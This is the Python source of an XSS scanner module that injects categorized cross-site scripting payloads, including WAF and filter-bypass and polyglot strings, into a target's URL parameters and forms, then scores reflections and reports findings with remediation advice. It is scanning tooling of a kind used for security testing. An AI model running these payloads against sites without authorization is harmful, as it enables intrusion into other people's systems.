"""XSS (Cross-Site Scripting) Scanner Module for detecting XSS vulnerabilities."""

import asyncio
import httpx
import re
import json
from typing import Dict, List, Any, Optional, Set
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, quote
from html import escape, unescape
import hashlib
from ..base_module import (
    BaseScannerModule,
    ScanConfig,
    ScanResult,
    Vulnerability,
    SeverityLevel,
    ScanType
)

class XSSScanner(BaseScannerModule):
    """Cross-Site Scripting (XSS) vulnerability scanner."""
    
    def __init__(self):
        super().__init__()
        self.name = "XSSScanner"
        self.description = "Detects Cross-Site Scripting (XSS) vulnerabilities"
        self.scan_type = ScanType.ACTIVE
        
        # XSS payloads categorized by type
        self.xss_payloads = {
            'basic': [
                # Basic script tags
                '<script>alert(1)</script>',
                '<script>alert("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                
                # IMG tags
                '<img src=x onerror=alert(1)>',
                '<img src="x" onerror="alert(1)">',
                '<img/src="x"/onerror="alert(1)">',
                
                # SVG tags
                '<svg onload=alert(1)>',
                '<svg/onload=alert(1)>',
                
                # Body tags
                '<body onload=alert(1)>',
                '<body/onload=alert(1)>',
                
                # Input tags
                '<input onfocus=alert(1) autofocus>',
                '<input/onfocus=alert(1) autofocus>',
                
                # Iframe
                '<iframe src="javascript:alert(1)">',
                '<iframe/src="javascript:alert(1)">',
            ],
            
            'encoded': [
                # HTML entity encoding
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                
                # URL encoding
                '%3Cscript%3Ealert(1)%3C/script%3E',
                '%3Cimg%20src=x%20onerror=alert(1)%3E',
                
                # Unicode encoding
                '\u003cscript\u003ealert(1)\u003c/script\u003e',
                '\u003cimg\u0020src=x\u0020onerror=alert(1)\u003e',
            ],
            
            'event_handlers': [
                # Various event handlers
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
                "' onclick='alert(1)",
                
                # Breaking out of attributes
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>',
                "'><img src=x onerror=alert(1)>",
            ],
            
            'javascript_protocol': [
                'javascript:alert(1)',
                'javascript:alert("XSS")',
                'javascript:void(alert(1))',
                'JaVaScRiPt:alert(1)',
                'javascript&#58;alert(1)',
                'javascript&#x3A;alert(1)',
            ],
            
            'dom_based': [
                # DOM-based XSS payloads
                '#<script>alert(1)</script>',
                '?name=<script>alert(1)</script>',
                '#"><img src=x onerror=alert(1)>',
                '?search="><script>alert(1)</script>',
                
                # Location-based
                'javascript:alert(document.location)',
                'javascript:alert(document.cookie)',
            ],
            
            'filter_bypass': [
                # Filter bypass techniques
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script >alert(1)</script>',
                '<script\t>alert(1)</script>',
                '<script\n>alert(1)</script>',
                "<script/**/>alert(1)</script>",
                
                # Double encoding
                '%253Cscript%253Ealert(1)%253C/script%253E',
                
                # Null bytes
                '<scri\x00pt>alert(1)</scri\x00pt>',
                
                # Comments
                '<!--<script>alert(1)</script>-->',
                
                # Case variations
                '<IMG SRC=x onerror="alert(1)">',
                '<iMg SrC=x OnErRoR=alert(1)>',
            ],
            
            'polyglot': [
                # Polyglot payloads that work in multiple contexts
                'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
                '">\'><img src=x onerror=alert(1)>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
            ],
            
            'stored_xss_test': [
                # Payloads for testing stored XSS
                '<script>alert("STORED_XSS_TEST_" + Date.now())</script>',
                '<img src=x onerror="console.log(\'STORED_XSS_\' + Date.now())">',
                '<svg onload="alert(\'STORED_XSS\')">',
            ]
        }
        
        # Patterns indicating successful XSS
        self.xss_indicators = [
            r'<script[^>]*>alert\([^)]*\)</script>',
            r'onerror\s*=\s*["\']?alert\(',
            r'onload\s*=\s*["\']?alert\(',
            r'onclick\s*=\s*["\']?alert\(',
            r'onmouseover\s*=\s*["\']?alert\(',
            r'onfocus\s*=\s*["\']?alert\(',
            r'javascript:\s*alert\(',
            r'<img[^>]*onerror[^>]*>',
            r'<svg[^>]*onload[^>]*>',
            r'<body[^>]*onload[^>]*>',
            r'<iframe[^>]*src\s*=\s*["\']?javascript:',
        ]
        
        # Context detection patterns
        self.context_patterns = {
            'html_tag': r'<[^>]*{payload}[^>]*>',
            'html_attribute': r'[a-zA-Z]+\s*=\s*["\']?{payload}',
            'javascript': r'<script[^>]*>[^<]*{payload}[^<]*</script>',
            'url': r'(href|src|action)\s*=\s*["\']?[^"\']*{payload}',
            'css': r'<style[^>]*>[^<]*{payload}[^<]*</style>',
        }
        
        # WAF detection patterns
        self.waf_indicators = [
            'blocked', 'forbidden', 'not acceptable',
            'security policy', 'access denied', 'illegal',
            'malicious', 'attack detected', 'waf',
            'firewall', 'protection', '403 forbidden'
        ]
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for XSS testing."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform XSS vulnerability scan."""
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'xss_types_found': [],
            'contexts_tested': [],
            'waf_detected': False,
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'reflected_xss': 0,
            'stored_xss': 0,
            'dom_xss': 0,
        }
        
        try:
            # Ensure URL has scheme
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            # Check for WAF
            waf_detected = await self._detect_waf(target_url)
            info['waf_detected'] = waf_detected
            if waf_detected:
                warnings.append("WAF detected - results may be limited")
            
            # Test based on scan type
            if config.scan_type == ScanType.PASSIVE:
                # Only check for obvious XSS indicators without injection
                passive_vulns = await self._passive_xss_check(target_url)
                vulnerabilities.extend(passive_vulns)
            else:
                # Active XSS testing
                
                # 1. Test reflected XSS in URL parameters
                reflected_results = await self._test_reflected_xss(target_url, config, waf_detected)
                vulnerabilities.extend(reflected_results['vulnerabilities'])
                info['tested_parameters'].extend(reflected_results['tested_params'])
                statistics['reflected_xss'] = len(reflected_results['vulnerabilities'])
                
                # 2. Test forms for XSS
                form_results = await self._test_form_xss(target_url, config, waf_detected)
                vulnerabilities.extend(form_results['vulnerabilities'])
                
                # 3. Test DOM-based XSS
                dom_results = await self._test_dom_xss(target_url, config)
                vulnerabilities.extend(dom_results)
                statistics['dom_xss'] = len(dom_results)
                
                # 4. Test for stored XSS indicators
                if config.scan_type == ScanType.AGGRESSIVE:
                    stored_results = await self._test_stored_xss(target_url, config)
                    vulnerabilities.extend(stored_results)
                    statistics['stored_xss'] = len(stored_results)
                
                # 5. Test different contexts
                context_results = await self._test_context_based_xss(target_url, config)
                vulnerabilities.extend(context_results['vulnerabilities'])
                info['contexts_tested'] = context_results['contexts']
            
            # Update statistics
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['parameters_tested'] = len(info['tested_parameters'])
            statistics['urls_tested'] = 1
            
            # Determine XSS types found
            xss_types = set()
            for vuln in vulnerabilities:
                if 'reflected' in vuln.name.lower():
                    xss_types.add('Reflected XSS')
                elif 'stored' in vuln.name.lower():
                    xss_types.add('Stored XSS')
                elif 'dom' in vuln.name.lower():
                    xss_types.add('DOM-based XSS')
            info['xss_types_found'] = list(xss_types)
            
            # Extract vulnerable parameters
            for vuln in vulnerabilities:
                if 'parameter' in vuln.evidence:
                    info['vulnerable_parameters'].append(vuln.evidence['parameter'])
            
        except Exception as e:
            errors.append(f"XSS scan failed: {str(e)}")
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _detect_waf(self, url: str) -> bool:
        """Detect if a WAF is present."""
        try:
            async with httpx.AsyncClient(verify=False) as client:
                # Send a malicious payload to trigger WAF
                test_payload = '<script>alert(1)</script>'
                response = await client.get(f"{url}?test={test_payload}")
                
                # Check for WAF indicators
                response_text = response.text.lower()
                for indicator in self.waf_indicators:
                    if indicator in response_text:
                        return True
                
                # Check status code
                if response.status_code in [403, 406, 419, 429, 503]:
                    return True
                    
        except:
            pass
        
        return False
    
    async def _passive_xss_check(self, url: str) -> List[Vulnerability]:
        """Check for XSS vulnerabilities without active injection."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Check for unsafe inline scripts
                if '<script>' in response.text and 'document.write' in response.text:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Potential DOM XSS - Unsafe document.write",
                            description="Page uses document.write with potentially unsafe content",
                            severity=SeverityLevel.MEDIUM,
                            confidence=0.6,
                            affected_urls=[url],
                            remediation="Avoid using document.write. Use safe DOM manipulation methods.",
                            cwe_ids=["CWE-79"]
                        )
                    )
                
                # Check for unsafe eval usage
                if 'eval(' in response.text or 'Function(' in response.text:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Potential XSS - Unsafe eval() usage",
                            description="Page uses eval() or Function() which can lead to XSS",
                            severity=SeverityLevel.MEDIUM,
                            confidence=0.5,
                            affected_urls=[url],
                            remediation="Avoid using eval() and Function(). Use JSON.parse() for JSON data.",
                            cwe_ids=["CWE-79"]
                        )
                    )
                
                # Check for missing CSP header
                if 'content-security-policy' not in response.headers:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="Missing Content Security Policy",
                            description="No CSP header found - increases XSS risk",
                            severity=SeverityLevel.LOW,
                            confidence=1.0,
                            affected_urls=[url],
                            remediation="Implement Content Security Policy to mitigate XSS attacks.",
                            references=["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"]
                        )
                    )
                    
        except:
            pass
        
        return vulnerabilities
    
    async def _test_reflected_xss(self, url: str, config: ScanConfig, waf_detected: bool) -> Dict[str, Any]:
        """Test for reflected XSS vulnerabilities with improved verification."""
        vulnerabilities = []
        tested_params = []
        
        # Parse URL for parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try common parameter names
            params = {'q': ['test'], 'search': ['test'], 'name': ['test'], 'id': ['1']}
        
        # Select payloads based on scan type and WAF presence
        if config.scan_type == ScanType.ACTIVE:
            payloads = self.xss_payloads['basic'][:5]
        elif config.scan_type == ScanType.AGGRESSIVE:
            if waf_detected:
                payloads = self.xss_payloads['filter_bypass'] + self.xss_payloads['encoded']
            else:
                payloads = self.xss_payloads['basic'] + self.xss_payloads['event_handlers']
        else:
            payloads = self.xss_payloads['basic'][:3]
        
        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            # Get baseline response for comparison
            baseline_response = await client.get(url)
            baseline_length = len(baseline_response.text)
            
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                original_value = param_values[0] if param_values else 'test'
                
                for payload in payloads:
                    # Create unique marker for tracking
                    marker = hashlib.md5(f"{param_name}{payload}".encode()).hexdigest()[:8]
                    marked_payload = payload.replace('alert(1)', f'alert("{marker}")')
                    
                    # Test with payload
                    test_params = params.copy()
                    test_params[param_name] = [marked_payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        response = await client.get(test_url)
                        
                        # Enhanced verification with multiple checks
                        is_reflected, reflection_confidence = self._verify_xss_reflection(
                            marked_payload, response.text, marker, baseline_length, len(response.text)
                        )
                        
                        if is_reflected:
                            # Determine context
                            context = self._determine_context(marked_payload, response.text)
                            
                            # Adjust confidence based on verification strength
                            final_confidence = reflection_confidence * 0.9  # Max 0.9 for reflected XSS
                            
                            # Adjust severity based on context
                            severity = SeverityLevel.HIGH
                            if context in ['html_attribute', 'javascript']:
                                severity = SeverityLevel.CRITICAL
                            elif context == 'html_content' and escape(marked_payload) in response.text:
                                severity = SeverityLevel.MEDIUM  # Partially encoded
                                final_confidence *= 0.7
                            
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Reflected XSS in parameter '{param_name}'",
                                    description=f"Parameter '{param_name}' appears vulnerable to reflected XSS in {context} context",
                                    severity=severity,
                                    confidence=final_confidence,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'payload': payload,
                                        'context': context,
                                        'marker': marker,
                                        'reflection_type': 'unencoded' if marked_payload in response.text else 'partial',
                                    },
                                    remediation="Encode all user input before outputting to HTML. Use context-appropriate encoding.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                                    ],
                                    cwe_ids=["CWE-79"]
                                )
                            )
                            break  # Found XSS, no need to test more payloads for this param
                            
                    except:
                        pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params
        }
    
    def _verify_xss_reflection(self, payload: str, response_text: str, marker: str, 
                               baseline_length: int, response_length: int) -> tuple:
        """Enhanced XSS reflection verification with confidence scoring."""
        confidence = 0.0
        
        # Check 1: Exact payload reflection (highest confidence)
        if payload in response_text:
            confidence = 0.9
            
            # Check if it's in a script context (very high confidence)
            if re.search(f'<script[^>]*>.*{re.escape(payload)}.*</script>', response_text, re.DOTALL):
                confidence = 1.0
            # Check if it's in an event handler (very high confidence)
            elif re.search(f'on\\w+=["\']?[^"\']*{re.escape(payload)}', response_text):
                confidence = 0.95
        
        # Check 2: Marker presence (medium confidence)
        elif marker in response_text:
            confidence = 0.7
            
            # Check if marker appears in dangerous context
            if re.search(f'<script[^>]*>.*{re.escape(marker)}.*</script>', response_text, re.DOTALL):
                confidence = 0.85
        
        # Check 3: Partial reflection (low confidence)
        elif any(part in response_text for part in payload.split() if len(part) > 4):
            confidence = 0.4
        
        # Check 4: Response length anomaly (very low confidence)
        length_diff = abs(response_length - baseline_length)
        if length_diff > len(payload) * 2 and confidence == 0:
            confidence = 0.2
        
        # Check for encoding (reduces confidence)
        if escape(payload) in response_text and payload not in response_text:
            confidence *= 0.5  # Payload is HTML encoded, less likely to execute
        
        return confidence > 0.3, confidence
    
    async def _test_form_xss(self, url: str, config: ScanConfig, waf_detected: bool) -> Dict[str, Any]:
        """Test forms for XSS vulnerabilities."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Find forms
                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
                forms = form_pattern.findall(response.text)
                
                for form_html in forms[:3]:  # Test up to 3 forms
                    # Extract form details
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        from urllib.parse import urljoin
                        action = urljoin(url, action)
                    
                    # Extract input fields
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_html)
                    
                    # Extract textarea fields
                    textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                    textareas = textarea_pattern.findall(form_html)
                    
                    all_fields = inputs + textareas
                    
                    # Test each field
                    for field_name in all_fields:
                        # Skip certain field types
                        if field_name.lower() in ['csrf', 'token', 'captcha', 'password']:
                            continue
                        
                        # Select appropriate payload
                        if waf_detected:
                            payload = self.xss_payloads['filter_bypass'][0]
                        else:
                            payload = self.xss_payloads['basic'][0]
                        
                        marker = hashlib.md5(f"{field_name}{payload}".encode()).hexdigest()[:8]
                        marked_payload = payload.replace('alert(1)', f'alert("{marker}")')
                        
                        form_data = {field_name: marked_payload}
                        
                        # Add other fields with default values
                        for other_field in all_fields:
                            if other_field != field_name and other_field not in form_data:
                                form_data[other_field] = 'test'
                        
                        try:
                            # Determine method
                            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                            method = method_match.group(1).upper() if method_match else 'POST'
                            
                            if method == 'POST':
                                test_response = await client.post(action, data=form_data)
                            else:
                                test_response = await client.get(action, params=form_data)
                            
                            # Check if XSS is reflected
                            if self._is_xss_reflected(marked_payload, test_response.text, marker):
                                vulnerabilities.append(
                                    Vulnerability(
                                        module=self.name,
                                        name=f"XSS in form field '{field_name}'",
                                        description=f"Form field '{field_name}' is vulnerable to XSS",
                                        severity=SeverityLevel.HIGH,
                                        confidence=0.9,
                                        affected_urls=[action],
                                        evidence={
                                            'form_action': action,
                                            'field': field_name,
                                            'method': method,
                                            'payload': payload,
                                        },
                                        remediation="Sanitize and encode all form inputs before processing and displaying.",
                                        cwe_ids=["CWE-79"]
                                    )
                                )
                                
                        except:
                            pass
                            
        except:
            pass
        
        return {'vulnerabilities': vulnerabilities}
    
    async def _test_dom_xss(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test for DOM-based XSS vulnerabilities."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                # Test with DOM XSS payloads in fragment
                for payload in self.xss_payloads['dom_based'][:3]:
                    test_url = f"{url}{payload}"
                    response = await client.get(test_url)
                    
                    # Check for dangerous sinks
                    dangerous_sinks = [
                        'document.write', 'document.writeln',
                        'innerHTML', 'outerHTML',
                        'eval', 'setTimeout', 'setInterval',
                        'Function', 'location.href',
                        'location.replace', 'location.assign'
                    ]
                    
                    for sink in dangerous_sinks:
                        if sink in response.text and 'location.hash' in response.text:
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Potential DOM XSS via {sink}",
                                    description=f"Page uses {sink} with location.hash which may lead to DOM XSS",
                                    severity=SeverityLevel.MEDIUM,
                                    confidence=0.7,
                                    affected_urls=[url],
                                    evidence={
                                        'sink': sink,
                                        'source': 'location.hash',
                                    },
                                    remediation=f"Avoid using {sink} with user-controlled input. Sanitize data from location.hash.",
                                    cwe_ids=["CWE-79"]
                                )
                            )
                            break
                            
        except:
            pass
        
        return vulnerabilities
    
    async def _test_stored_xss(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test for stored XSS vulnerabilities."""
        vulnerabilities = []
        
        # This is a basic check - real stored XSS testing requires more complex logic
        # and potentially multiple requests to test persistence
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Check if page displays user-generated content
                user_content_indicators = [
                    'comment', 'post', 'message', 'review',
                    'feedback', 'guestbook', 'forum', 'blog'
                ]
                
                page_text = response.text.lower()
                has_user_content = any(indicator in page_text for indicator in user_content_indicators)
                
                if has_user_content:
                    # Check for lack of output encoding
                    if not any(header in response.headers for header in ['x-xss-protection', 'content-security-policy']):
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name="Potential Stored XSS Risk",
                                description="Page displays user content without proper XSS protection headers",
                                severity=SeverityLevel.MEDIUM,
                                confidence=0.5,
                                affected_urls=[url],
                                remediation="Implement output encoding and CSP for user-generated content.",
                                cwe_ids=["CWE-79"]
                            )
                        )
                        
        except:
            pass
        
        return vulnerabilities
    
    async def _test_context_based_xss(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test XSS in different contexts (HTML, JavaScript, CSS, etc.)."""
        vulnerabilities = []
        contexts_tested = []
        
        # Context-specific payloads
        context_payloads = {
            'html': '<img src=x onerror=alert(1)>',
            'attribute': '" onmouseover="alert(1)" x="',
            'javascript': '</script><script>alert(1)</script>',
            'url': 'javascript:alert(1)',
            'css': '</style><script>alert(1)</script><style>',
        }
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query) or {'test': ['value']}
        
        async with httpx.AsyncClient(verify=False) as client:
            for param_name in list(params.keys())[:2]:  # Test first 2 params
                for context, payload in context_payloads.items():
                    contexts_tested.append(context)
                    
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        response = await client.get(test_url)
                        
                        # Check if payload executed based on context
                        if self._check_context_execution(payload, response.text, context):
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"XSS in {context} context - parameter '{param_name}'",
                                    description=f"XSS vulnerability in {context} context",
                                    severity=SeverityLevel.HIGH,
                                    confidence=0.85,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'context': context,
                                        'payload': payload,
                                    },
                                    remediation=f"Use context-appropriate encoding for {context} context.",
                                    cwe_ids=["CWE-79"]
                                )
                            )
                            
                    except:
                        pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'contexts': list(set(contexts_tested))
        }
    
    def _is_xss_reflected(self, payload: str, response_text: str, marker: str = None) -> bool:
        """Check if XSS payload is reflected and potentially executable."""
        # Check if payload is in response
        if payload not in response_text:
            return False
        
        # Check for specific XSS indicators
        for pattern in self.xss_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check if marker is present (for unique identification)
        if marker and marker in response_text:
            return True
        
        # Check if payload appears unencoded
        if payload in response_text and escape(payload) not in response_text:
            return True
        
        return False
    
    def _determine_context(self, payload: str, response_text: str) -> str:
        """Determine the context where payload is reflected."""
        # Check various contexts
        if re.search(f'<[^>]*{re.escape(payload)}[^>]*>', response_text):
            return 'html_tag'
        elif re.search(f'[a-zA-Z]+\\s*=\\s*["\']?[^"\']*{re.escape(payload)}', response_text):
            return 'html_attribute'
        elif re.search(f'<script[^>]*>[^<]*{re.escape(payload)}[^<]*</script>', response_text, re.IGNORECASE):
            return 'javascript'
        elif re.search(f'<style[^>]*>[^<]*{re.escape(payload)}[^<]*</style>', response_text, re.IGNORECASE):
            return 'css'
        else:
            return 'html_content'
    
    def _check_context_execution(self, payload: str, response_text: str, context: str) -> bool:
        """Check if payload executed in specific context."""
        if context == 'html':
            return '<img' in response_text and 'onerror' in response_text
        elif context == 'attribute':
            return 'onmouseover' in response_text and payload in response_text
        elif context == 'javascript':
            return '</script><script>' in response_text
        elif context == 'url':
            return 'javascript:' in response_text
        elif context == 'css':
            return '</style><script>' in response_text
        return False
